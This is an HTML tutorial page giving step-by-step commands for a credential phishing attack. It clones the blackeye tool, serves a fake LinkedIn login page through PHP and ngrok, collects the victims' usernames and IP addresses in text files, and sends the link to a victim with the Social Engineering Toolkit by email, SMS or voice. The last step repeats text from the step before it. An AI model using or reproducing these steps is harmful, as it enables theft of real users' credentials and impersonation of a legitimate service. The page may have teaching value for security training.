<h6>ver. 25-June-2022</h6>
<h3>Phishing Attack with <i><font color = blue>blackeye</font></i></h3>
<font size=4 color = dark red><i>: Spear Phising, Smishing, Vishing, Whaling<i></font>
<h4>Step-1. Create a fake web-page: Will use LinkedIn page in blackeye tool</h4>
<ul><em>
    <li>sudo git clone https://github.com/An0nUD4Y/blackeye</li>
    <li>cd blackeye</li>
    <li>ls</li>
</em></ul>

<h4>Step-2. Run black eye for downloading ngrok</h4>
<ul><em>
    <li>sudo blackeye.sh</li>
    <h5>// linkedIn -> #9 </h5>
</em></ul>

<h4>Step-3. Open two terminals</h4>
<ul><em>
    <h5><u> At first terminal</u></h5>
    <li>ngrok http 8080</li> 
    <h5>// Copy the link to the fake page</h5>
    <h5><u> At second terminal</u></h5>
    <li>cd blackeye/sites/linkedin</li>
    <li>php -S localhost:8080</li>
    <h5>// Open a web-browser and goto "localhost:8080", and check the fake site</h5>
</em></ul>

<h4>Step-4. Sign up ngrok account(It's free)</h4>
<ul><em>
    <h5>// log-in to ngrok.com</h5>
    <h5>// Setup & Installation</h5>
    <h5> a. Unzip to install: Unzip the downloaded file and replace the git-hub downloaded ngrok file with this file(update)</h5>
    <h5> b. Connect your account</h5>
    <li>ngrok authtoken "token-of-yours"</li>
    <h5>// Copy and paste </h5>
    <h5><u> Go to first terminal and reload ngrok</u></h5>
    <li>ngrok http 8080</li>
    <h5>// Open a web-browser and goto "ngrok-fake-site-address", and log-in to the fake LinkedIn</h5>
    <h5>// Check username.txt and ip.txt in sites/LinkedIn </h5>
</em></ul>

<h4>Step-5. Send the link to the fake site to a victim: email, sms, voice, etc.</h4>
<ul><em>
    <h5>// Use Social Engineering Toolkit(SET)</h5>
    <li>sudo setoolkit</li>
    <h5>// Copy and paste </h5>
    <h5><u> Go to first terminal and reload ngrok</u></h5>
    <li>ngrok http 8080</li>
    <h5>// Open a web-browser and goto "ngrok-fake-site-address", and log-in to the fake LinkedIn</h5>
    <h5>// Check username.txt and ip.txt in sites/LinkedIn </h5>
</em></ul>
